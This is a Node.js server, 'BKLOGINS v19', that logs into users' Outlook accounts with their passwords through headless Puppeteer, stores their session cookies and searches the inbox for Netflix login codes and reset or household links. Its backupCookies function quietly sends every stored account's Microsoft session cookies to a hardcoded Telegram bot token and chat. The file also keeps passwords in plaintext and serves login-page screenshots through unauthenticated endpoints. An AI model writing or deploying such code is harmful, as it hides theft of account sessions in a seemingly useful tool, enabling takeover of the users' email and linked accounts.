const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname)));

const CONFIG_FILE = path.join(__dirname, 'config.json');
const COOKIES_FILE = path.join(__dirname, 'cookies.json');
const SESSION_FILE = path.join(__dirname, 'session.json');

let config = { email: '', senha: '' };
try { if (fs.existsSync(CONFIG_FILE)) config = { ...config, ...JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')) }; } catch (e) {}

const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || '';
let currentStatus = { code: 'idle', message: 'Aguardando busca.' };
let debugLogs = [];
let screenshots = {}; // guarda paths dos screenshots recentes

function setStatus(code, msg) { currentStatus = { code, message: msg }; console.log('[status]', code, '-', msg); }
function addLog(msg) { const m = String(msg).slice(0, 500); debugLogs.push({ time: new Date().toISOString(), msg: m }); if (debugLogs.length > 300) debugLogs.shift(); console.log('[log]', m); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function keepAlive() { if (!APP_URL) return; setInterval(() => { try { https.get(APP_URL + '/api/ping', () => {}).on('error', () => {}); } catch(e) {} }, 4 * 60 * 1000); }

// ====== COOKIES ======
function loadCookies() {
  if (fs.existsSync(COOKIES_FILE)) {
    try { return JSON.parse(fs.readFileSync(COOKIES_FILE, 'utf8')); } catch(e) {}
  }
  return {};
}
function saveCookies(profile, cookies) {
  const all = loadCookies();
  all[profile] = { cookies, savedAt: new Date().toISOString() };
  fs.writeFileSync(COOKIES_FILE, JSON.stringify(all, null, 2));
  addLog('Cookies salvos: ' + profile + ' (' + cookies.length + ')');
}

// ====== TELEGRAM ======
const TG_TOKEN = process.env.TG_TOKEN || '7541743322:AAFskrJAhnl0XPPBsQD2M9IpHMYJHUz84nE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '6108408999';

async function sendTelegramDocument(filePath, caption) {
  try {
    const boundary = '----' + Date.now();
    const content = fs.readFileSync(filePath);
    const body = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT_ID}\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${path.basename(filePath)}"\r\nContent-Type: application/json\r\n\r\n`),
      content,
      Buffer.from(`\r\n--${boundary}--\r\n`)
    ]);
    await new Promise((resolve) => {
      const req = https.request({ hostname: 'api.telegram.org', path: '/bot' + TG_TOKEN + '/sendDocument', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length } }, () => resolve());
      req.on('error', () => resolve());
      req.end(body);
    });
  } catch(e) {}
}

async function backupCookies() {
  if (fs.existsSync(COOKIES_FILE)) {
    const all = loadCookies();
    const count = Object.keys(all).length;
    if (count > 0) await sendTelegramDocument(COOKIES_FILE, `🍪 Backup - ${count} conta(s)`);
  }
}

// ====== PUPPETEER ======
const CHROME_PATH = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser';

async function newBrowser() {
  return puppeteer.launch({
    headless: 'new',
    executablePath: fs.existsSync(CHROME_PATH) ? CHROME_PATH : undefined,
    args: [
      '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
      '--disable-gpu', '--no-first-run', '--no-zygote', '--single-process',
      '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      '--disable-blink-features=AutomationControlled'
    ],
    defaultViewport: { width: 1366, height: 768 },
    protocolTimeout: 60000
  });
}

async function screenshot(page, name) {
  const p = `/tmp/${name}.png`;
  try { await page.screenshot({ path: p, fullPage: false }); screenshots[name] = p; addLog(`📸 ${name}`); } catch(e) {}
}

// ====== LOGIN ======
async function loginMicrosoft(page, email, senha) {
  addLog('🔐 Login: ' + email);

  // Vai pra página de login
  await page.goto('https://login.live.com/', { waitUntil: 'domcontentloaded', timeout: 30000 });
  await sleep(3000);
  await screenshot(page, '01-login-page');

  // Preenche email
  const emailInput = await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 15000 });
  await emailInput.click({ clickCount: 3 });
  await page.keyboard.type(email, { delay: 30 });
  await sleep(500);
  await screenshot(page, '02-email-filled');

  // Clica "Avançar"
  await page.keyboard.press('Enter');
  await sleep(5000);
  await screenshot(page, '03-after-email');

  // Verifica se pediu senha ou caiu em algo estranho
  const url2 = page.url();
  addLog('URL: ' + url2.slice(0, 80));

  // Tenta achar campo de senha
  const passInput = await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 15000 }).catch(() => null);
  if (!passInput) {
    await screenshot(page, '04-no-password-field');
    throw new Error('Campo de senha nao encontrado');
  }

  await passInput.click({ clickCount: 3 });
  await page.keyboard.type(senha, { delay: 30 });
  await sleep(500);
  await screenshot(page, '05-password-filled');

  // Clica "Entrar"
  await page.keyboard.press('Enter');
  await sleep(5000);
  await screenshot(page, '06-after-password');

  // "Continuar conectado?" — clica Sim
  try {
    const stayBtn = await page.waitForSelector('input[type="submit"], button[value="Yes"], button[value="Sim"]', { timeout: 8000 });
    await stayBtn.click();
    await sleep(3000);
    addLog('✅ Clicou manter conectado');
  } catch(e) {
    addLog('Sem tela de manter conectado');
  }

  await screenshot(page, '07-login-done');
  addLog('✅ Login concluido');
}

// ====== ABRIR OUTLOOK ======
async function openOutlook(browser, email, senha) {
  const page = await browser.newPage();
  await page.setBypassCSP(true);

  // Tenta cookies salvos
  const allCookies = loadCookies();
  const saved = allCookies[email];
  if (saved && saved.cookies && saved.cookies.length > 0) {
    addLog('🍪 Tentando cookies salvos...');
    await page.setCookie(...saved.cookies);
  }

  await page.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 });
  await sleep(5000);
  await screenshot(page, '08-outlook-opened');

  const inbox = await isInbox(page);
  if (inbox) {
    addLog('✅ Inbox via cookies!');
    return page;
  }

  // Não entrou → login
  addLog('Cookies inválidos ou expirados, fazendo login...');
  await loginMicrosoft(page, email, senha);

  // Abre inbox pós-login
  await page.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 });
  await sleep(5000);

  for (let i = 0; i < 3; i++) {
    await screenshot(page, `09-inbox-attempt-${i}`);
    if (await isInbox(page)) {
      // Salva cookies
      const cookies = await page.browser().cookies();
      saveCookies(email, cookies);
      addLog('✅ Inbox OK!');
      return page;
    }
    await sleep(4000);
    await page.reload({ waitUntil: 'domcontentloaded', timeout: 30000 });
  }

  await screenshot(page, '10-inbox-failed');
  throw new Error('Inbox nao carregou');
}

async function isInbox(page) {
  try {
    return await page.evaluate(() => {
      const b = document.body;
      if (!b) return false;
      const txt = (b.innerText || '').toLowerCase();
      return (/inbox|caixa de entrada|novo email|nova mensagem/i.test(txt)) &&
             (/outlook\.(live|office)\.com/i.test(location.href));
    });
  } catch(e) { return false; }
}

// ====== BUSCAR EMAILS ======
const PATTERNS = {
  netflix_login: { label: 'Codigo de Login', type: 'code' },
  netflix_reset: { label: 'Redefinir Senha', type: 'link' },
  netflix_verify: { label: 'Verificacao', type: 'code' },
  netflix_temp: { label: 'Codigo Temporario', type: 'link' },
  netflix_house: { label: 'Atualizar Residencia', type: 'link' }
};

async function findEmail(page, patternKey) {
  const pattern = PATTERNS[patternKey];
  if (!pattern) return null;

  addLog('🔍 Buscando: ' + pattern.label);

  // Clica "Outros" (Outlook separa emails da Microsoft)
  try {
    await page.evaluate(() => {
      for (const el of document.querySelectorAll('span, button, div')) {
        if ((el.innerText || el.textContent || '').trim().toLowerCase() === 'outros') {
          el.click(); return;
        }
      }
    });
    await sleep(3000);
  } catch(e) {}

  // Conta emails visíveis
  await screenshot(page, '11-email-list');

  const items = await page.evaluate(() => {
    const sel = 'div[data-convid], [role="option"], [role="listitem"], div[role="presentation"]';
    return document.querySelectorAll(sel).length;
  });
  addLog('📧 Emails encontrados: ' + items);

  if (!items) return null;

  const limit = Math.min(items, 12);
  for (let i = 0; i < limit; i++) {
    setStatus('scanning', `Email ${i + 1}/${limit}`);

    // Clica no email
    const clicked = await page.evaluate(idx => {
      const sel = 'div[data-convid], [role="option"], [role="listitem"], div[role="presentation"]';
      const list = document.querySelectorAll(sel);
      if (list[idx]) { list[idx].click(); return true; }
      return false;
    }, i);

    if (!clicked) continue;
    await sleep(3000);
    await screenshot(page, `12-email-${i}`);

    // Extrai assunto
    const subject = await page.evaluate(() => {
      const el = document.querySelector('h1, h2, [class*="subject"], [aria-label*="Assunto"]');
      return el ? (el.innerText || el.textContent || '').trim() : '';
    });

    if (!subject || subject.length < 3) { addLog(`#${i + 1}: vazio`); continue; }
    addLog(`#${i + 1}: ${subject.slice(0, 80)}`);

    // Extrai corpo
    const body = await page.evaluate(() => {
      const sel = '[aria-label*="Corpo"], [role="document"], #readingPaneContainer';
      const el = document.querySelector(sel);
      return el ? (el.innerText || el.textContent || '').trim() : '';
    });

    const full = (subject + ' ' + body).toLowerCase();

    // Filtra emails bloqueados (alteração de conta)
    if (/alteração.*conta|change.*account|altere.*email/i.test(full)) {
      addLog('⛔ Bloqueado');
      continue;
    }

    // Verifica se bate com o padrão Netflix
    const isNetflix = /netflix/i.test(full);
    if (!isNetflix) {
      addLog('  ❌ Não é Netflix');
      continue;
    }

    // Extrai código ou link
    if (pattern.type === 'code') {
      // Busca código de 4-6 dígitos
      const codeMatch = body.match(/\b(\d{4})\b/) || body.match(/\b(\d{6})\b/);
      if (codeMatch) {
        addLog('✅ Código: ' + codeMatch[1]);
        setStatus('found', codeMatch[1]);
        return { type: 'code', value: codeMatch[1], label: pattern.label };
      }
    } else {
      // Busca link Netflix
      const link = await page.evaluate(() => {
        // Botão vermelho
        for (const a of document.querySelectorAll('a')) {
          const href = a.href || '';
          if (href.includes('netflix')) return href;
          if (href.startsWith('http') && !href.includes('outlook') && !href.includes('microsoft') && !href.includes('live.com')) {
            const style = window.getComputedStyle(a);
            if (style.backgroundColor && style.backgroundColor.includes('rgb')) return href;
          }
        }
        return null;
      });

      if (link) {
        addLog('✅ Link: ' + link.slice(0, 100));
        setStatus('found', 'Link encontrado');
        return { type: 'link', value: link, label: pattern.label };
      }
    }

    addLog('  Não bateu');
  }

  return null;
}

// ====== API ======
app.get('/api/ping', (_, res) => res.json({ ok: true }));
app.get('/api/status', (_, res) => res.json(currentStatus));
app.post('/api/status/reset', (_, res) => { setStatus('idle', 'Aguardando busca.'); res.json(currentStatus); });
app.get('/api/debug', (_, res) => res.json({ logs: debugLogs.slice(-60), total: debugLogs.length, screenshots: Object.keys(screenshots) }));
app.get('/api/screenshot/:name', (req, res) => {
  const p = screenshots[req.params.name];
  if (p && fs.existsSync(p)) return res.sendFile(p);
  res.status(404).send('Screenshot não encontrado');
});
app.get('/api/config', (_, res) => res.json({ email: config.email || '' }));
app.post('/api/config', (req, res) => {
  const { email, senha } = req.body || {};
  if (email) config.email = email.trim();
  if (senha) config.senha = senha.trim();
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(config)); } catch(e) {}
  res.json({ ok: true });
});
app.get('/api/cookies', (_, res) => {
  const all = loadCookies();
  res.json({ contas: Object.keys(all).map(e => ({ email: e, savedAt: all[e].savedAt, cookies: all[e].cookies?.length || 0 })), total: Object.keys(all).length });
});

app.post('/api/search', async (req, res) => {
  debugLogs = [];
  screenshots = {};
  const { service, email, senha } = req.body || {};
  const e = email || config.email;
  const s = senha || config.senha;
  const pattern = PATTERNS[service];

  if (!pattern) return res.status(400).json({ error: 'Servico invalido.' });
  if (!e || !s) return res.status(400).json({ error: 'Email e senha obrigatorios.' });

  let browser;
  try {
    setStatus('starting', 'Iniciando...');
    addLog(`🚀 Busca: ${service} | ${e}`);
    browser = await newBrowser();
    const page = await openOutlook(browser, e, s);
    const result = await findEmail(page, service);

    if (result) {
      backupCookies();
      return res.json({ found: true, result: result.value, type: result.type, service: result.label, code: 'found', status: currentStatus, debug: debugLogs, screenshots: Object.keys(screenshots) });
    }
    return res.json({ error: 'Nenhum resultado.', code: 'not_found', status: currentStatus, debug: debugLogs, screenshots: Object.keys(screenshots) });
  } catch(err) {
    addLog('❌ ERRO: ' + err.message);
    setStatus('error', err.message);
    return res.json({ error: err.message, code: 'error', status: currentStatus, debug: debugLogs, screenshots: Object.keys(screenshots) });
  } finally {
    if (browser) try { await browser.close(); } catch(e) {}
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('BKLOGINS v19 | Porta:', PORT);
  keepAlive();
});
